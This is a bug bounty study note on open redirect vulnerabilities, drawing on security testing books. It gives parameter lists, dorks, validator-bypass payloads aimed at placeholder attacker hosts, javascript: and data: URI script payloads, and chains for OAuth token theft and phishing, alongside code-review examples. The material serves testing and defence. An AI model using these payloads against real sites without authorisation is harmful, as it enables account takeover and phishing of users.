# Open Redirects
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## What It Is
A server-side redirect that uses user-controlled input to determine the redirect destination. Standalone = Low severity. Combined with OAuth or SSRF → High severity.

## Finding Open Redirects

### Parameters to Test
```
?next=, ?url=, ?redirect=, ?redirect_uri=, ?return=, ?returnTo=, ?goto=
?dest=, ?destination=, ?redir=, ?r=, ?to=, ?out=, ?view=, ?from=, ?ref=
?referer=, ?callback=, ?forward=, ?target=, ?link=, ?location=, ?back=
```

### Google Dorks for Redirect Parameters
```
site:target.com inurl:redirect
site:target.com inurl:return
site:target.com inurl:next
site:target.com inurl:url=
site:target.com inurl:goto=
site:target.com inurl:destination=
site:target.com inurl:redir=

# Wayback Machine approach
gau target.com | grep -Ei "redirect|return|next|url|goto|dest" | sort -u
```

### Basic Payloads
```
https://example.com/login?next=https://evil.com
https://example.com/logout?redirect=https://evil.com
```

---

## Validator Bypass Techniques

### @-Symbol Trick
The `@` in a URL means everything before it is credentials (ignored by browsers):
```
https://example.com/login?next=https://example.com@evil.com
https://example.com/login?next=https://target.com%40attacker.com
```
Browser redirects to `evil.com`, treating `example.com` as credentials.

### Double Encoding
```
https://example.com/login?next=https%3A%2F%2Fevil.com
https://example.com/login?next=%68%74%74%70%73%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
https://attacker.com%252F%252Ftarget.com  # Double URL encoding
```

### Protocol Bypass
```
//evil.com          → protocol-relative URL, resolves to https://evil.com
////evil.com
\evil.com           → treated as //evil.com by some parsers
\/evil.com
https:attacker.com  # Autocorrect bypass
https:\\\attacker.com
///attacker.com
/\/attacker.com
javascript:alert(1)  → if JavaScript URIs allowed
```

### Whitelist Bypass
If validator checks `startsWith('https://example.com')`:
```
https://example.com.evil.com
https://example.com@evil.com
https://example.com.attacker.com  # subdomain confusion
```

If validator checks `endsWith('example.com')` or `includes('example.com')`:
```
https://evil.com?url=https://example.com   # query string confusion
https://evil.com#example.com               # fragment confusion
https://evil.example.com.evil.com
https://attacker.com?target.com            # query parameter
```

### Path Traversal Bypass
```
https://example.com/../../..//evil.com
https://example.com/.%2F.%2F.%2F/evil.com
```

### Subdomain Bypass
```
https://evil.example.com  → if only checking domain, not full URL
```

### Null Byte
```
https://example.com/login?next=https://evil.com%00https://example.com
```

### Types of Redirects

1. **Parameter-based**: `/redirect?url=https://evil.com` (most common)
2. **Referer-based**: Server redirects to `Referer` header value after login
3. **Path-based**: `/https://evil.com` or `/redirect/https://evil.com`

### data: URL (Executes JS in Some Contexts)
```
data:text/html,<script>alert(document.domain)</script>
```

---

## Escalating Open Redirects

### OAuth Token Theft
Open redirect on OAuth `redirect_uri` can steal access tokens:
```
# Chain with OAuth:
/oauth/authorize?...&redirect_uri=https://example.com/redirect?url=https://attacker.com
# OR via path traversal:
/oauth/authorize?...&redirect_uri=https://example.com/oauth/callback/../../../evil.com
```
Auth code redirected to attacker's site → exchange code for access token → account takeover.

### Phishing
Use a legit domain to redirect users to a convincing phishing page:
```
https://target.com/logout?next=https://attacker.com/fake-login
```
Because the link starts with `https://target.com`, users trust it.

### SSRF Chaining
If a feature fetches a URL that can be open-redirected, chain the open redirect to point to internal services.

---

## Detection in Code Review

### PHP
```php
// Vulnerable
$redirect = $_GET['url'];
header("Location: $redirect");

// Vulnerable (whitelist bypass possible)
if (strpos($redirect, 'example.com') !== false) {
    header("Location: $redirect");
}
```

### Python
```python
# Vulnerable
return redirect(request.args.get('next'))

# Secure pattern
from urllib.parse import urlparse
def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https') and parsed.netloc == 'example.com'
```

---

## Testing Checklist
- [ ] Find all redirect parameters in the app (including Referer-based)
- [ ] Test with external URL (https://evil.com)
- [ ] Test @-symbol bypass
- [ ] Test protocol-relative (//)
- [ ] Test whitelist bypass techniques
- [ ] Test double encoding
- [ ] Test on login/logout flows (highest impact)
- [ ] Chain with OAuth if `redirect_uri` parameter found
- [ ] Check Wayback Machine for redirect params

## Real-World Examples (Yaworski)
- **Shopify** ($500): Open redirect via login flow `return` parameter
- **HackerOne** ($1,000): Open redirect via API endpoint → chain to OAuth token theft
- **Twitter** ($700): Redirect to Twitter.com-prefixed domain that attacker controlled

## Severity
- **Low (standalone)**: User redirected to external site
- **Medium**: Trusted domain redirect to convincing phishing page
- **High**: OAuth token theft via open redirect
- **High**: SSRF via redirect chain to internal resources
